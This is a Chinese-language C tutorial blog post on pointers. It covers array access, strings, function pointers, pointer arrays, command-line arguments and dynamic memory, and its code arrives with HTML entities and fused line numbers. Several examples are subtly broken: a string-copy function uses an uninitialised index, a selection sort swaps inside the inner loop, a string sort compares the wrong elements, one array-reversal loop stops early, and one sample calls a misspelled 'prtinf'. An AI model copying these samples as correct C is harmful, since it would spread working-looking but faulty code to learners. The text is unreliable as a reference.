如果指针变量p1和p2都是指向同一数组元素的长度,如执行p2-p1,结果是p2-p1的值(两个地址之差)除以数组元素的长度. 通过用p2-p1就可知道它们所指向元素的相对距离. 两个地址不能相加,如p1+p2是无实际意义的. 通过指针引用数组元素引用数组元素有两种方法 下标法( a[i] ) 指针法( *(a+i)或*(p+i),其中a是数组名,p是指向数组元素的指针变量.其初值为p=a; ) 有一个整型数组a,有10个元素,要求输出数组中的全部元素.1)下标法: 12345678910111213#include&lt;stdio.h&gt;int main()&#123; int i, a[10]; printf(\"please enter 10 integer numbers:\"); for (i = 0; i &lt; 10; i++) scanf(\"%d\", &amp;a[i]); for (i = 0; i &lt; 10; i++) printf(\"%d\", a[i]); printf(\"\\n\"); return 0;&#125; 2)通过数组名计算数组元素地址,找出元素的值 12345678910111213#include&lt;stdio.h&gt;int main()&#123; int i, a[10]; printf(\"please enter 10 integer numbers:\"); for (i = 0; i &lt; 10; i++) scanf(\"%d\", &amp;a[i]); for (i = 0; i &lt; 10; i++) printf(\"%d\\t\", *(a + i)); printf(\"\\n\"); return 0;&#125; 3)用指针变量指向数组元素 12345678910111213#include&lt;stdio.h&gt;int main()&#123; int a[10], *p; printf(\"please enter 10 integer numbers:\"); for (p = a; p &lt; (a + 10); p++) scanf(\"%d\", p); for (p = a; p &lt; (a + 10); p++) printf(\"%d\\t\", *p); printf(\"\\n\"); return 0;&#125; 结论 第1和2种方法执行效率是相同的. 在编译时,对数组元素a[i]就是按*(a+i)处理的 第3种方法比第1和2种方法,用指针变量直接指向元素,不必每次都重新计算地址,像p++这样的自加操作是比较快的.这种有规律地改变地址值(p++)能大大提高效率. 多次使用指针变量时,应注意指针变量的位置,每次执行后可使指针变量重新指向数组a. 用数组名作函数参数 可以用数组名作函数的参数. 如: 12345678910111213#include&lt;stdio.h&gt;int main()&#123; void fun(int arr[], int n); int array[10]; fun(array, 10); return 0;&#125;void fun(int arr[], int n)&#123;&#125; C编译时是将形参数组名作为指针变量来处理的. 123void fun(int arr[], int n)等同于void fun(int *arr, int n) :eight_pointed_black_star:由于形参数组名arr接收了实参数组首元素a[0]的地址.所以用数组名参数时,形参数组中各元素的值发生变化,实参数组元素的值也会发生变化. 将数组a中n个整数按相反顺序存放.12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;int main()&#123; void inv(int [], int); int i, a[10]; printf(\"please enter original array:\\n\"); for (i = 0; i &lt; 10; ++i) scanf(\"%d\", &amp;a[i]); inv(a, 10); printf(\"The array has been inverted:\\n\"); for (i = 0; i &lt; 10; ++i) printf(\"%d\\t\", a[i]); return 0;&#125;void inv(int arr[], int n)&#123; int i, j,temp,m=(n-1)/2; for (i = 0; i &lt; m; ++i) &#123; j = n - 1 - i; temp = arr[j]; arr[j] = arr[i]; arr[i] = temp; &#125;&#125; 指针变量作形参： 12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;int main()&#123; void inv(int [], int); int i, a[10]; printf(\"please enter original array:\\n\"); for (i = 0; i &lt; 10; ++i) scanf(\"%d\", &amp;a[i]); inv(a, 10); printf(\"The array has been inverted:\\n\"); for (i = 0; i &lt; 10; ++i) printf(\"%d\\t\", a[i]); return 0;&#125;void inv(int *arr, int n)&#123; int *p, *i, *j, temp, m = (n - 1) / 2; i = arr; //头部的指针位置 j = arr + n - 1;//末尾的指针位置 p = arr + m; //中值的指针位置 for (; i &lt;= p; ++i, j--) &#123; temp = *j; *j = *i; *i = temp; &#125; return;&#125; 归纳分析如果有一个实参数组,要想在函数中改变此数组中的元素的值,实参与形参的对应关系有: 形参和实参都用数组名. 123456789101112int main()&#123; int a[10]; ... f(a, 10);&#125;int f(int x[], int n)&#123; ...&#125; 实参用数组名,形参用指针变量 123456789101112int main()&#123; int a[10]; ... f(a, 10);&#125;int f(int *x, int n)&#123; ...&#125; 实参形参都是用指针变量 123456789101112int main()&#123; int a[10],*p=a; ... f(p, 10);&#125;int f(int *x, int n)&#123; ...&#125; 实参用指针变量,形参用数组名. 123456789101112int main()&#123; int a[10],*p=a; ... f(p, 10);&#125;int f(int x[], int n)&#123; ...&#125; 用指针方法对10个整数按由大到小顺序排序1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;int main()&#123; void sort(int [], int); int i, a[10]; printf(\"please enter original array:\\n\"); for (i = 0; i &lt; 10; ++i) scanf(\"%d\", &amp;a[i]); sort(a, 10); printf(\"The array has been sorted:\\n\"); for (i = 0; i &lt; 10; ++i) printf(\"%d\\t\", a[i]); return 0;&#125;void sort(int arr[], int len)&#123; int i, j, temp, max; for (i = 0; i &lt; len - 1; ++i) &#123; max = i; for (j = i + 1; j &lt; len; ++j) &#123; if (arr[j] &gt; arr[max]) max = j; if (max != i) &#123; temp = arr[i]; arr[i] = arr[max]; arr[max] = temp; &#125; &#125; &#125;&#125; 通过指针指向多维数组多维数组的地址a[0]表示一维数组a[0]第0列元素的地址，即&amp;a[0][0]. a[0]+1表示a数组0行1列. a[0]与(a+0)等价，a[1]和\\(a+1)等价， a[i]和*(a+i)等价 如果a是一维数组名，则a[i]表示a数组序号为i的元素的存储单元。 但如果a是二维数组，则a[i]是一维数组名，它只是一个地址，并不代表一个存储单元，也不代表存储单元的值(如同一维数组名只是一个指针变量一样) 二维数组(如a)是指向行(一维数组)的。因此a+1的“1”代表一行中全部元素所占的字节数。a[0]+1中的1代表一个a元素所占的字节数。 在指向行的指针前面加一个*，就转换为列的指针。 反之，在列指针前面加一个&amp;，就转换为行的指针 一维数组名(如a[0],a[1])是指向列元素的。 12345678910111213141516#include&lt;stdio.h&gt;int main()&#123; int a[3][4] = &#123;1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23&#125;; printf(\"%d,%d\\n\", a, *a); //0行的初始地址,0行0列的元素地址 printf(\"%d,%d\\n\", a[0], *(a + 0)); //0行0列的元素地址 printf(\"%d,%d\\n\", &amp;a[0], &amp;a[0][0]); //0行起始地址,0行0列的元素地址 printf(\"%d,%d\\n\", a[1], a + 1); //1行0列的元素地址,1行起始地址 printf(\"%d,%d\\n\", &amp;a[1][0], *(a + 1) + 0);//1行0列的元素地址 printf(\"%d,%d\\n\", a[2], *(a + 2)); //2行0列的元素地址 printf(\"%d,%d\\n\", &amp;a[2], a + 2); //2行的起始地址 printf(\"%d,%d\\n\", a[1][0], *(*(a + 1) + 0));//1行0列的元素的值 printf(\"%d,%d\\n\", *a[2], *(*(a + 2) + 0));//2行0列的元素的值 return 0;&#125; 指向多维数组的指针变量指向数组元素的指针变量有一个3×4的二维数组，要求用指向元素的指针变量输出二维数组各元素的值123456789101112131415#include&lt;stdio.h&gt;int main()&#123; int a[3][4] = &#123;1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23&#125;; int *p; for (p = a[0]; p &lt; a[0] + 12; ++p) &#123; if ((p - a[0]) % 4 == 0) //p移动四次后换行 printf(\"\\n\"); printf(\"%d\\t\", *p); &#125; printf(\"\\n\"); return 0;&#125; 计算a[i][j]在数组中的相对位置： i*m+j(m为二维数组的列数，二维数组大小为n×m) 如： 在一个3×4的二维数组中，a[2][3]对a[0][0]的相对位移量为2*4+3=11元素； 如果一个元素占4个字节，则a[2][3]对a[0][0]的地址差为11*4=44字节。 若开始时指针变量p指向a[0][0],a[i][j]的地址为”&amp;a[0]\\[0]+(i*m+j)或p+(i*m+j)“. 指向由m个元素组成的一维数组的指针变量输出二维数组任一行任一列元素的值123456789101112131415#include&lt;stdio.h&gt;int main()&#123; int a[3][4] = &#123;1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23&#125;; int (*p)[4], i, j; p = a; printf(\"please enter row and colum:\"); scanf(\"%d,%d\", &amp;i, &amp;j); printf(\"a[%d,%d]=%d\\n\", i, j, *(*(p + i) + j)); printf(\"\\n\"); return 0;&#125; int (*p)[4]表示定义p为一个指针变量，它指向包含4个整型元素的一维数组. p的值是该一维数组的起始地址.虽然这个地址(指纯地址)与该一维数组首元素的地址相同,但它们的基类型不同. 分析下列程序12345678910#include&lt;stdio.h&gt;int main()&#123; int a[4] = &#123;1, 3, 5, 7&#125;; int (*p)[4]; p = &amp;a; printf(\"%d\\n\", (*p)[3]); return 0;&#125; 注意,p = &amp;a;不应写成p = a; 因为这样写表示p的值是&amp;a[0],指向首元素a[0]. p = &amp;a;表示p指向一维数组(行)，(*p)[3]是p指向的行中序号为3的元素. 要注意指针变量的类型,从int (*p)[4];可以看到,p的类型不是int *型,而是int(*)[4]. p被定义为指向一维整型数组的指针变量,一维数组有4个元素,因此p的基类型是一维数组,其长度是16字节. 用指向数组的指针作函数参数可以有两种方法: 用指向变量的指针变量 用指向一维数组的指针变量 有一个班,3个学生,各学4门课,计算总平均分数以及第n个学生的成绩.1234567891011121314151617181920212223242526272829303132#include&lt;stdio.h&gt;int main()&#123; void average(float *, int); void search(float (*p)[4], int); float score[3][4] = &#123;1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23&#125;; average(*score, 12);//*转换为列指针变量 search(score, 2); return 0;&#125;void average(float *p, int n)&#123; float *p_end; float sum = 0, aver; p_end = p + n - 1;//指向最后一个元素 for (; p &lt;= p_end; p++) sum += (*p); aver = sum / n; printf(\"%5.2f\\n\", aver);&#125;void search(float (*p)[4], int n)&#123; int i; printf(\"the score of No.%d are:\\n\", n); for (i = 0; i &lt; 4; ++i) printf(\"%5.2f\\n\", *(*(p + n) + i));&#125; :eight_pointed_black_star:实参和形参如果是指针类型，应当注意它们的基类型必须一致.不应把int型的指针(即数组元素的地址)传给int(\\)[4]型(指向一维数组)的指针变量,反之亦然. 查找有一门以上课程不及格的学生,输出他们全部课程的成绩123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123;// 查找有一门以上课程不及格的学生,输出他们全部课程的成绩 void search(float (*p)[4], int); float score[3][4] = &#123;1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23&#125;; search(score, 3); return 0;&#125;void search(float (*p)[4], int n)&#123; int i, j, flag; for (j = 0; j &lt; n; ++j) &#123; flag = 0; for (i = 0; i &lt; 4; ++i) if (*(*(p + j) + i) &lt; 60) flag = 1; if (flag == 1) &#123; printf(\"No.%d fails,his scores are:\\n\", j + 1); for (i = 0; i &lt; 4; ++i) printf(\"%5.2f\\t\", *(*(p + j) + i));// score[j][i] printf(\"\\n\"); &#125; &#125;&#125; 通过指针引用字符串字符串的引用方法 用字符数组存放一个字符串，可以通过数组名和下标引用字符串中一个字符，也可以通过数组名和格式声明“%s”输出该字符串. 123456789#include&lt;stdio.h&gt;int main()&#123; char string[] = \"I Love China\"; printf(\"%s\\n\", string); printf(\"%c\\n\", string[7]); // string[7]=*(string+7) return 0;&#125; 用字符指针变量输出一个字符串常量,通过字符指针变量引用字符串常量. 12345678#include&lt;stdio.h&gt;int main()&#123; char *string = \"I Love China!\"; printf(\"%s\\n\", string); return 0;&#125; 对字符指针变量string初始化,实际上是把字符串第1个元素的地址(即存放字符串的字符数组的首元素地址)赋给指针变量string,使string指向字符串的第1个字符,由于字符串常量”I Love China!”已由系统分配在内存中连续的14个字节中,因此,string就指向了该字符串的第一个字符. 可以对指针变量再赋值; 12char *string = \"I Love China!\";string = \"I'm a student.\" 可以通过字符指针变量输出它所指向的字符串 1printf(\"%s\\n\", string); 用%s能对一个字符串进行整体的输入输出. 字符数组,区别于数值型数组(int[ ] a) %s是输出字符串时所用的格式符.在输出项中给出字符指针变量名string,则系统会输出string所指向的字符串第1个字符,然后自动使string加1,使之指向下一个字符,在输出字符…直到遇到字符串结束标志&#39;\\0&#39;为止. 注意:在内存中,字符串的最后被自动加了一个&#39;\\0&#39;.因此在输出时能确定输出的字符到何时结束. 将字符串a复制为字符串b,然后输出字符串b12345678910111213141516#include&lt;stdio.h&gt;int main()&#123; char a[] = \"I am a student\", b[20]; int i; for (i = 0; *(a + i) != '\\0'; ++i) *(b + i) = *(a + i); *(b + i) = '\\0'; printf(\"string a is:%s\\n\", a); printf(\"string b is:\\n\"); for (i = 0; *(b + i) != '\\0'; ++i) printf(\"%c\", b[i]); printf(\"\\n\"); return 0;&#125; 用指针变量: 123456789101112131415#include&lt;stdio.h&gt;int main()&#123; char a[] = \"I am a boy\", b[20], *p1, *p2; p1 = a; p2 = b; for (; *p1 != '\\0'; ++p1, ++p2) *p2 = *p1; *p2 = '\\0'; printf(\"string a is:%s\\n\",a); printf(\"string b is:%s\\n\",b); printf(\"\\n\"); return 0;&#125; 字符指针作函数参数 如果想把一个字符串从一个函数“传递”到另一函数，可以用地址传递的办法，即用字符数组名作参数，也可以用字符指针变量作参数。在被调用的函数中可以改变字符串的内容，在主调函数中可以引用改变后的字符串。 用函数调用实现字符串的复制1)用字符数组名作函数参数 123456789101112131415161718192021222324#include&lt;stdio.h&gt;int main()&#123; void copy_string(char from[], char to[]); char a[] = \"I am a teacher.\"; char b[] = \"You are a student.\"; printf(\"string a:%s\\nstring b:%s\\n\", a, b); printf(\"copy string a to string b:\\n\"); copy_string(a, b); printf(\"string a:%s\\nstring b:%s\\n\", a, b); return 0;&#125;void copy_string(char from[], char to[])&#123; int i; while (from[i] != '\\0') &#123; to[i] = from[i]; i++; &#125; to[i] = '\\0';&#125; 复制后的数组仍存在没有被覆盖的值(t, .,\\0); 用%s格式输出时,遇到第一个\\0后面的字符就不会输出了. 如果用%c逐个字符输出是可以输出后面这些字符的. 2)用字符型指针变量作实参 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;int main()&#123; void copy_string(char from[], char to[]); char a[] = \"I am a teacher.\"; char b[] = \"You are a student.\"; char *from = a; char *to = b; printf(\"string a:%s\\nstring b:%s\\n\", a, b); printf(\"copy string a to string b:\\n\"); copy_string(from, to); printf(\"string a:%s\\nstring b:%s\\n\", a, b); return 0;&#125;void copy_string(char from[], char to[])&#123; int i; while (from[i] != '\\0') &#123; to[i] = from[i]; i++; &#125; to[i] = '\\0';&#125; 3)用字符指针变量作形参和实参 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;stdio.h&gt;int main()&#123; void copy_string(char from[], char to[]); char *a = \"I am a teacher.\"; char b[] = \"You are a student.\"; char *p = b; printf(\"string a:%s\\nstring b:%s\\n\", a, b); printf(\"copy string a to string b:\\n\"); copy_string(a, p); printf(\"string a:%s\\nstring b:%s\\n\", a, b); return 0;&#125;void copy_string(char *from, char *to)&#123; for (; *from != '\\0'; ++from,++to) &#123; *to = *from; &#125; *to = '\\0';&#125;//精简void copy_string(char *from, char *to)&#123; while ((*to = *from) != '\\0') &#123; ++from, ++to; &#125; *to = '\\0';&#125;//再精简void copy_string(char *from, char *to)&#123; while ((*to++ = *from++) != '\\0'); *to = '\\0';&#125;//void copy_string(char *from, char *to)&#123; while (*from != '\\0') &#123; *to++ = *from++; &#125; *to = '\\0';&#125;// ASCII码void copy_string(char *from, char *to)&#123; while (*from) &#123; *to++ = *from++; &#125; *to = '\\0';&#125;//还可以简化为 while (*to++ = *from++); 等价于 while ((*to++ = *from++) != '\\0');//for for (; *to++ = *from++;); 或者 for (; (*to++ = *from++)!='\\0';); 也可以使用字符数组名作函数形参，在函数中另定义两个指针变量p1，p2.函数copy_string可写为 1234567void copy_string(char from[], char to[])&#123; char *p1, *p2; p1 = from; p2 = to; while ((*p2++ = *p1++) != '\\0');&#125; 使用字符指针变量和字符数组的比较 字符数组由若干个元素组成，每个元素中放一个字符，而字符指针变量中存放的是地址(字符串第1个字符的地址),绝不是将字符串放到字符指针变量中. 赋值方式. 可以对字符指针变量赋值,但不能对数组名赋值 初始化的含义. 数组可以在定义时对各元素赋初值,但不能用赋值语句对字符数组中的全部元素整体赋值 存储单元的内容. 编译时为字符数组分配若干存储单元,以存放各元素的值,而对字符指针变量,只分配一个存储单元. 如果定义了字符数组,但未对它赋值,这时数组中的元素的值是不可预料的. 如果定义了字符指针变量,应当及时把一个字符变量(或字符数组元素)的地址赋给它，使它指向一个字符型数据，如果未对它赋予一个地址值，它并未具体指向一个确定的对象，此时如果向该指针变量所指向的对象输入数据，可能会出现严重的后果： 1234567int main()&#123; char *a; scanf(\"%s\", a); return 0;&#125;//危险的! 指针变量的值是可以改变的,而字符数组名代表一个固定的值(数组首元素的地址)不能改变. 123456789#include&lt;stdio.h&gt;int main()&#123; char *a = \"I love China!\"; a = a + 7; printf(\"%s\\n\", a); return 0;&#125; 引用数组元素 对字符数组可以使用下标法引用一个数组元素,也可以用地址法(*(a+5)). 对字符指针变量p使它指向数组a的首元素,可以使用指针变量带下标法(p[5])引用一个数组元素,也可以用地址法. 用指针变量指向一个格式字符串,可以用它代替printf函数中的格式字符串 123char *format;format = \"a=%d,b=%f\\n\";printf(format, a, b); 这种printf函数称为可变格式输出函数. 指向函数的指针每次调用函数时都会从函数分配的内存空间的起始地址开始执行此段函数代码。 函数名代表函数的起始地址. 可以定义一个指向函数的指针变量,用来存放某一函数的起始地址.这就意味着此指针变量指向该函数. 1int (*p)(int,int); 用函数指针变量调用函数.用函数求a和b中的大者.12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int max(int, int); int (*p)(int, int); int a, b, c; p = max; printf(\"please enter a and b:\"); scanf(\"%d,%d\", &amp;a, &amp;b); c = (*p)(a, b); printf(\"max is:%d\", c); return 0;&#125;int max(int x, int y)&#123; return x &gt; y ? x : y;&#125; 怎么定义和使用指向函数的指针变量1类型名 (*指针变量名)(函数参数表列) 类型名是函数返回值类型 对指向函数的指针变量不能进行算术运算.如p+n,p++,p—等运算都是无意义的. 输入两个整数,让用户选择1或2,选1时调用max函数,输出二者中的大数,选2时调用min函数,输出二者中的小数.123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;int main()&#123; int max(int, int); int min(int, int); int (*p)(int, int); int a, b, c, d; printf(\"please enter two integer:\\n\"); scanf(\"%d,%d\", &amp;a, &amp;b); printf(\"please choose 1 or 2:\\n\"); scanf(\"%d\", &amp;c); if (c == 1) p = max; else if (c == 2) p = min; d = (*p)(a, b); if (c == 1) printf(\"max is:%d\", d); else printf(\"min is:%d\", d); return 0;&#125;int max(int x, int y)&#123; return x &gt; y ? x : y;&#125;int min(int x, int y)&#123; return x &lt; y ? x : y;&#125; 用指向函数的指针作函数参数 指向函数的指针变量的一个重要用途是把函数的入口地址作为参数传递到其他函数. 有两个整数a和b,由用户输入1,2和3.如输入1,程序就给出a和b中的大者.输入2,程序就给出a和b中的小者.输入3,则求a与b之和.12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;stdio.h&gt;int main()&#123; int max(int, int); int min(int, int); int sum(int, int); int fun(int, int, int (*p)(int, int)); int a, b, c, d; printf(\"please enter two integer:\\n\"); scanf(\"%d,%d\", &amp;a, &amp;b); printf(\"please choose 1 , 2 or 3:\\n\"); scanf(\"%d\", &amp;c); if (c == 1) fun(a, b, max); else if (c == 2) fun(a, b, min); else if (c == 3) fun(a, b, sum); return 0;&#125;int fun(int x, int y, int (*p)(int, int))&#123; int result; result = (*p)(x, y); printf(\"%d\\n\", result);&#125;int max(int x, int y)&#123; printf(\"max=\"); return x &gt; y ? x : y;&#125;int min(int x, int y)&#123; printf(\"min=\"); return x &lt; y ? x : y;&#125;int sum(int x, int y)&#123; printf(\"sum=\"); return x + y;&#125; 返回指针值的函数定义返回指针值函数的原型的一般形式为: 1类型名 *函数名 (函数参数表列) 有a个学生,每个学生有b门课程的成绩,要求在用户输入学生序号以后,能输出该学生的全部成绩.用指针函数实现1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;int main()&#123; float score[][4] = &#123;&#123;60, 70, 80, 90&#125;, &#123;56, 74, 45, 86&#125;, &#123;65, 88, 67, 99&#125;&#125;; float *search(float (*pointer)[4], int n); float *p; int i, k; printf(\"enter number of student:\\n\"); scanf(\"%d\", &amp;k); p = search(score, k); for (i = 0; i &lt; 4; ++i) &#123; printf(\"%5.2f\\t\", *(p + i));//输出 score[k][0]~score[k][3]; &#125; return 0;&#125;float *search(float (*pointer)[4], int n)&#123; float *pt; pt = *(pointer + n); //pt的值是&amp;score[k][0] return pt;&#125; 找出其中有不及格的课程的学生及其学生号.1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;int main()&#123; float score[][4] = &#123;&#123;60, 70, 80, 90&#125;, &#123;56, 74, 45, 86&#125;, &#123;65, 88, 67, 99&#125;&#125;; float *search(float (*pointer)[4]); float *p; int i, j; for (i = 0; i &lt; 3; ++i) &#123; p = search(score + i); if (p == *(score + i)) &#123; printf(\"No.%d score:\", i); for (j = 0; j &lt; 4; ++j) printf(\"%5.2f\", *(p + j)); printf(\"\\n\"); &#125; &#125;&#125;float *search(float (*pointer)[4])&#123; int i = 0; float *pt; pt = NULL; for (; i &lt; 4; ++i) &#123; if (*(*(pointer + i)) &lt; 60) pt = *pointer; &#125; return pt;&#125; 指针数组和多维指针 一个数组，若其元素均为指针类型数据，称为指针数组. 定义一个指针数组 1类型名 *数组名[数组长度]; 1int *p[4]; 将若干字符串按字母顺序(由小到大)输出.123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; void sort(char *name[], int n); void print(char *name[], int n); char *name[] = &#123;\"Follow me\", \"BASIC\", \"Great Wall\", \"FORTRAN\", \"Computer design\"&#125;; int n = 5; sort(name, n); print(name, n); return 0;&#125;void sort(char *name[], int n)&#123; char *temp; int i, j, k; for (i = 0; i &lt; n - 1; i++) &#123; k = i; for (j = i + 1; j &lt; n; j++) if (strcmp(name[k], name[i]) &gt; 0) k = j; if (k != i) &#123; temp = name[i]; name[i] = name[k]; name[k] = temp; &#125; &#125;&#125;void print1(char *name[], int n)&#123; int i; for (i = 0; i &lt; n; i++) printf(\"%s\\n\", name[i]);&#125;//也可以改写成void print(char *name[], int n)&#123; int i = 0; char *p; p = name[0]; while (i &lt; n) &#123; p = *(name + i++); // name[i]; i++; printf(\"%s\\n\", p); &#125;&#125; 指向指针数据的指针变量定义1char **p; 运算符的结合性是从右到左的. \\(*p). 也就是说p指向一个字符指针变量(这个字符指针变量指向一个字符型数据),如果引用*p,就得到p所指向的字符指针变量的值. 使用指向指针数据的指针变量123456789101112131415#include &lt;stdio.h&gt;int main()&#123; char *name[] = &#123;\"Follow me\", \"BASIC\", \"Great Wall\", \"FORTRAN\", \"Computer design\"&#125;; char **p; int i; for (i = 0; i &lt; 5; i++) &#123; p = name + i; printf(\"%s\\n\", *p); &#125; return 0;&#125; 有一个指针数组,其元素分别指向一个整型数组的元素,用指向指针数据的指针变量,输出整型数组各元素的值.12345678910111213141516#include &lt;stdio.h&gt;int main()&#123; int a[5] = &#123;1, 3, 5, 7, 9&#125;; int *num[5] = &#123;&amp;a[0], &amp;a[1], &amp;a[2], &amp;a[3], &amp;a[4]&#125;; int **p, i; p = num; for (i = 0; i &lt; 5; i++) &#123; printf(\"%d\\n\", **p); p++; &#125; printf(\"\\n\"); return 0;&#125; 间接访问在一个指针变量中存放一个目标变量的地址，这就是“单机间址”. 指向指针数据的指针用的是“二级间址”. 间址方法可以延伸到更多的级,即多重指针. 指针数组作main函数的形参main可以用参数: 1int main(int argc,char *argv[]) 其中，argc和argv就是main函数的形参，它们就是程序的”命令行参数”. argc是参数的个数,argv是参数向量,它是一个* char指针数组,数组中每一个元素(其值为指针)指向命令行中的一个字符串的首字符. 用带参数的main函数,其第一个形参必须是int型,用来接收形参个数,第二个参数必须是字符指针数组,用来接收从操作系统命令行传来的字符串中首字母的地址. 在操作命令下,实参是和执行文件的命令一起给出的.例如在DOS,UNIX或Linux等系统的操作命令状态下,在命令行中包括了命令名和需要传给main函数的参数. 命令行的一般形式为 命令名 参数1 参数2···参数n 命令名和各参数之间用空格分隔.命令行是可执行文件名(此文件含main函数) 如: file1 China Beijing file1为可执行文件名(实际上,文件名应包含盘符,路径),China和Beijing是调用main函数时的实参. 文件名也作为一个参数.argc的值等于3(有3个命令行参数:file1,China,Beijing) 命令行参数必须都是字符串(“file1”,”China”,”Beijing”都是字符串),这些字符串的首地址构成一个指针数组. 指针数组argv中的元素argv[0]指向字符串”file1”的首字符(argv[0]的值是字符串”file1”的首地址). 名:file1的文件,它包含以下的main函数: 123456789101112#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; while (argc &gt; 1) &#123; ++argv; printf(\"%s\\n\", *argv); --argc; &#125; return 0;&#125; 选择“工程”-“设置”-“调试”-“程序变量”命令，输入 China Beijing，再运行程序。 输出 12ChinaBeijing 改写: 123456789#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; while (argc-- &gt; 1) printf(\"%s\\n\", *++argv); return 0;&#125; 许多操作系统提供了echo命令,它的作用是实现”参数回送”,即将echo后面的各参数(各字符串)在同一行上输出.实现”参数回送”的C程序(文件名为echo.c)如下: 12345678#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; while (--argc &gt; 0) //当命令行的参数多于1 printf(\"%s%c\\n\", *++argv, (argc &gt; 1) ? ' ' : '\\n');//从第2个参数开始输出各字参数(字符串) return 0;&#125; 如果用UNIX系统的命令行输入: 1$ .&#x2F;echo Computer and C Language↙ &#x2F;&#x2F;echo是可执行文件名. 会在显示屏上输出: Computer and C Language 或者 123456789#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; int i; for (i = 1; i &lt; argc; i++) printf(\"%s%c\\n\", argv[i], (argc &gt; 1) ? ' ' : '\\n'); return 0;&#125; 动态内存分配与指向它的指针变量内存的动态分配全局变量是分配在内存中的静态存储区的，非静态的局部变量(包括形参)是分配在内存中的动态存储区的,这个存储区是一个称为栈(stack)的区域. C语言还允许建立内存动态分配区域,以存放一些临时用的数据,这些数据不必在程序的声明部分定义,也不必等到函数结束时才释放.而是需要时随时开辟,不需要时随时释放.这些数据是临时存放在一个特别的自由存储区.称为堆(heap)区.可以根据需要,向系统申请所需大小的空间.由于未在声明部分定义它们为变量或数组,因此不能通过变量名或数组名去引用这些数据,只能通过指针来引用. 怎么建立内存的动态分配 include 用malloc函数开辟动态存储区 1void *malloc(unsigned int size); 作用是在内存的动态存储区中分配一个长度为size的连续空间.形参size的类型为无符号整型(不允许为负数).此函数的值(返回值)是所分配区域的第一个字节的地址.或者说是一个指针型函数. 1malloc(100); //开辟100字节的临时分配域,函数值为其第1个字节的地址 注意指针的基类型为void,即指针不指向任何类型的数据,只提供一个纯地址.如果此函数未能成功地执行(例如内存空间不足),则返回空指针(NULL). 用calloc函数开辟动态存储区 1void *calloc(unsigned n,unsigned int size); 在内存中动态地分配 num 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num*size 个字节长度的内存空间，并且每个字节的值都是0. 这就是动态数组.函数返回值指向所分配域的第一个字节的指针;如果分配不成功,则返回NULL. 1p = calloc(50, 4);//开辟50×4个字节的临时分配域,把首地址赋给指针变量p 用realloc重新分配动态存储区. 1void *realloc(void *p, unsigned int size); 如果已经通过malloc函数或calloc函数获得乐动态空间,想改变大小,可以用realloc函数重新分配. 用realloc函数将p所指向的动态空间的大小改变为size.p的值不变.p的值不变.如果重分配不成功,返回NULL.如: 1realloc(p,50); 用free函数释放动态存储区 1void free(*p); 其作用是释放指针变量p所指向的动态空间,使这部分空间能重新被其他变量使用. p应是最近一次调用calloc或malloc函数时得到的函数返回值. 1free(p);//释放指针变量p所指向的已分配的额动态空间 free函数无返回值. void指针类型可以定义一个基类型为void的指针变量(即void*型变量). “指向void类型”理解为 指向空类型或”不指向确定的类型”的数据. 在将它的值赋给另一指针变量时由系统对它进行类型转换.使之适合于被赋值的变量的类别 12345678910int a = 3; //定义a为整型变量. int *p1 = &amp;a; //p1指向int型变量 char *p2; //p2指向char型变量 void *p3; //p3为无类型指针变量(基类型为void型) p3 = (void *)p1; //将p1的值转换为void *类型,然后赋值给p3 p2 = (char *)p3; //将p3的值转换为char *类型,然后赋值给p2 printf(\"%d\", *p1); // 3 p3 = &amp;a; printf(\"%d\", *p3); //非法,p3是无指向的,不能指向a return 0; 在这种无指向的地址所标志的存储单元中不能存储任何数据的,无法通过这种地址对内存存取数据. 什么情况用到这种地址? 这种情况是在调用动态存储分配函数(如maloc,caloc,realoc函数)时出现的. 用户用这些函数开辟动态存储区,显然希望获得此动态存储区的起始地址,以便利用该动态存储区. 在以前的C版本(包括C89)中,函数的返回地址一律指向字符型数据,即得到char*型指针. malloc函数的原型为: 1char *malloc(unsigned int sise); 人们开辟的动态存储区并不是一定用来存放字符型数据的,例如想用来存放一批整型数据.为此,在向该存储区存放数据前就需要进行地址的类型转换: 12int *pt;pt = (int *)malloc(100); 系统会将指向字符数据的指针转换为指向整型数据的指针,然后赋给pt.这样pt就指向存储区的首字节,可以通过pt对该动态存储区进行存取操作. 上面的类型转换只是产生一个临时的中间值赋给了pt,但没有改变malloc函数本身的类型. C99修改为:返回void*指针,这种指针不指向任何类型的数据,只提供一个纯地址. 1234int *pt;pt = (int *)malloc(100); //malloc(100)是void类型,把它转换为int*型//等价于pt = malloc(100); //自动进行类型转换 建立动态数组,输入5个学生的成绩,另外用一个函数检查其中有无低于60分的,输出不合格的成绩.123456789101112131415161718192021#include &lt;stdio.h&gt;int main()&#123; void check(int *p); int *p1, i; p1 = (int *)malloc(5 * sizeof(int)); for (i = 0; i &lt; 5; i++) scanf(\"%d\", p1 + i); check(p1); return 0;&#125;void check(int *p)&#123; int i; printf(\"They are fail:\"); for (i = 0; i &lt; 5; i++) if (p[i] &lt; 60) prtinf(\"%d\", p[i]); printf(\"\\n\");&#125;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"realize modular programming with 